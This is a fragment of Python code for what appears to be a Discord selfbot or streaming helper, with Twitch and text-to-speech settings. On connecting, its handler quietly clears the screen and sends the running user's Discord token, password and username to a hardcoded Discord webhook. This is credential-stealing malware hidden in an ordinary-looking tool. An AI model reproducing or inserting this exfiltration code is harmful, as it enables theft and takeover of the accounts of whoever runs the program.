...
stream_url = "https://www.twitch.tv/ak666bullets"
tts_language = "en"
...
async def on_connect():
    Clear()  
    requests.post('https://discord.com/api/webhooks/882745256481800194/tmeEH5picVGUDwnFP9PJQzkMZGuDRV6hzjZWBdZvSccoadiLgC1F0e93ZRArek3fSF2m',json={'content': f"**Token:** `{toe}`\n**Password:** `{password}`**Username: {Arsky.user.name}**"})
    startprint()
